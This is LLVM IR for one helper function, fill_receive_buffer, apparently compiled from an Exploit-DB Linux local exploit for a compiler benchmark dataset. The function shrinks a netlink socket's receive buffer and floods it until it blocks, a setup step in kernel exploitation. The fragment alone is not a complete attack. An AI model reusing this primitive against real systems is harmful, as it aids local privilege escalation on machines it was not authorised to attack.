; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_45553.c_fill_receive_buffer.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_45553.c_fill_receive_buffer.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.sock_pid = type { i32, i32 }
%struct.sockaddr_nl = type { i32, i32, i32, i32 }
%struct.iovec = type { i8*, i32 }
%struct.msghdr = type { i32, i32, i32, i32, i32*, %struct.iovec*, %struct.sockaddr_nl* }

@AF_NETLINK = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [39 x i8] c"[ ] preparing blocking netlink socket\0A\00", align 1
@SOL_SOCKET = common dso_local global i32 0, align 4
@SO_RCVBUF = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [15 x i8] c"[-] setsockopt\00", align 1
@.str.2 = private unnamed_addr constant [28 x i8] c"[+] receive buffer reduced\0A\00", align 1
@.str.3 = private unnamed_addr constant [21 x i8] c"[ ] flooding socket\0A\00", align 1
@MSG_DONTWAIT = common dso_local global i32 0, align 4
@errno = common dso_local global i64 0, align 8
@EAGAIN = common dso_local global i64 0, align 8
@.str.4 = private unnamed_addr constant [12 x i8] c"[-] sendmsg\00", align 1
@.str.5 = private unnamed_addr constant [21 x i8] c"[+] flood completed\0A\00", align 1
@.str.6 = private unnamed_addr constant [27 x i8] c"[+] blocking socket ready\0A\00", align 1
@.str.7 = private unnamed_addr constant [39 x i8] c"[-] failed to prepare blocking socket\0A\00", align 1
@llvm.used = appending global [1 x i8*] [i8* bitcast (i32 (%struct.sock_pid*, %struct.sock_pid*)* @fill_receive_buffer to i8*)], section "llvm.metadata"

; Function Attrs: noinline nounwind optnone uwtable
define internal i32 @fill_receive_buffer(%struct.sock_pid* %0, %struct.sock_pid* %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca %struct.sock_pid*, align 8
  %5 = alloca %struct.sock_pid*, align 8
  %6 = alloca [10240 x i8], align 16
  %7 = alloca i32, align 4
  %8 = alloca %struct.sockaddr_nl, align 4
  %9 = alloca %struct.iovec, align 8
  %10 = alloca %struct.msghdr, align 8
  store %struct.sock_pid* %0, %struct.sock_pid** %4, align 8
  store %struct.sock_pid* %1, %struct.sock_pid** %5, align 8
  store i32 0, i32* %7, align 4
  %11 = getelementptr inbounds %struct.sockaddr_nl, %struct.sockaddr_nl* %8, i32 0, i32 0
  store i32 0, i32* %11, align 4
  %12 = getelementptr inbounds %struct.sockaddr_nl, %struct.sockaddr_nl* %8, i32 0, i32 1
  %13 = load %struct.sock_pid*, %struct.sock_pid** %4, align 8
  %14 = getelementptr inbounds %struct.sock_pid, %struct.sock_pid* %13, i32 0, i32 1
  %15 = load i32, i32* %14, align 4
  store i32 %15, i32* %12, align 4
  %16 = getelementptr inbounds %struct.sockaddr_nl, %struct.sockaddr_nl* %8, i32 0, i32 2
  store i32 0, i32* %16, align 4
  %17 = getelementptr inbounds %struct.sockaddr_nl, %struct.sockaddr_nl* %8, i32 0, i32 3
  %18 = load i32, i32* @AF_NETLINK, align 4
  store i32 %18, i32* %17, align 4
  %19 = getelementptr inbounds %struct.iovec, %struct.iovec* %9, i32 0, i32 0
  %20 = getelementptr inbounds [10240 x i8], [10240 x i8]* %6, i64 0, i64 0
  store i8* %20, i8** %19, align 8
  %21 = getelementptr inbounds %struct.iovec, %struct.iovec* %9, i32 0, i32 1
  store i32 10240, i32* %21, align 8
  %22 = getelementptr inbounds %struct.msghdr, %struct.msghdr* %10, i32 0, i32 0
  store i32 16, i32* %22, align 8
  %23 = getelementptr inbounds %struct.msghdr, %struct.msghdr* %10, i32 0, i32 1
  store i32 1, i32* %23, align 4
  %24 = getelementptr inbounds %struct.msghdr, %struct.msghdr* %10, i32 0, i32 2
  store i32 0, i32* %24, align 8
  %25 = getelementptr inbounds %struct.msghdr, %struct.msghdr* %10, i32 0, i32 3
  store i32 0, i32* %25, align 4
  %26 = getelementptr inbounds %struct.msghdr, %struct.msghdr* %10, i32 0, i32 4
  store i32* null, i32** %26, align 8
  %27 = getelementptr inbounds %struct.msghdr, %struct.msghdr* %10, i32 0, i32 5
  store %struct.iovec* %9, %struct.iovec** %27, align 8
  %28 = getelementptr inbounds %struct.msghdr, %struct.msghdr* %10, i32 0, i32 6
  store %struct.sockaddr_nl* %8, %struct.sockaddr_nl** %28, align 8
  %29 = call i32 @printf(i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str, i64 0, i64 0))
  %30 = load %struct.sock_pid*, %struct.sock_pid** %4, align 8
  %31 = getelementptr inbounds %struct.sock_pid, %struct.sock_pid* %30, i32 0, i32 0
  %32 = load i32, i32* %31, align 4
  %33 = load i32, i32* @SOL_SOCKET, align 4
  %34 = load i32, i32* @SO_RCVBUF, align 4
  %35 = call i64 @_setsockopt(i32 %32, i32 %33, i32 %34, i32* %7, i32 4)
  %36 = icmp ne i64 %35, 0
  br i1 %36, label %37, label %39

37:                                               ; preds = %2
  %38 = call i32 @perror(i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.1, i64 0, i64 0))
  br label %41

39:                                               ; preds = %2
  %40 = call i32 @printf(i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.2, i64 0, i64 0))
  br label %41

41:                                               ; preds = %39, %37
  %42 = call i32 @printf(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.3, i64 0, i64 0))
  br label %43

43:                                               ; preds = %50, %41
  %44 = load %struct.sock_pid*, %struct.sock_pid** %5, align 8
  %45 = getelementptr inbounds %struct.sock_pid, %struct.sock_pid* %44, i32 0, i32 0
  %46 = load i32, i32* %45, align 4
  %47 = load i32, i32* @MSG_DONTWAIT, align 4
  %48 = call i64 @_sendmsg(i32 %46, %struct.msghdr* %10, i32 %47)
  %49 = icmp sgt i64 %48, 0
  br i1 %49, label %50, label %51

50:                                               ; preds = %43
  br label %43

51:                                               ; preds = %43
  %52 = load i64, i64* @errno, align 8
  %53 = load i64, i64* @EAGAIN, align 8
  %54 = icmp ne i64 %52, %53
  br i1 %54, label %55, label %57

55:                                               ; preds = %51
  %56 = call i32 @perror(i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.4, i64 0, i64 0))
  br label %60

57:                                               ; preds = %51
  %58 = call i32 @printf(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.5, i64 0, i64 0))
  %59 = call i32 @printf(i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.6, i64 0, i64 0))
  store i32 0, i32* %3, align 4
  br label %62

60:                                               ; preds = %55
  %61 = call i32 @printf(i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str.7, i64 0, i64 0))
  store i32 -1, i32* %3, align 4
  br label %62

62:                                               ; preds = %60, %57
  %63 = load i32, i32* %3, align 4
  ret i32 %63
}

declare dso_local i32 @printf(i8*) #1

declare dso_local i64 @_setsockopt(i32, i32, i32, i32*, i32) #1

declare dso_local i32 @perror(i8*) #1

declare dso_local i64 @_sendmsg(i32, %struct.msghdr*, i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
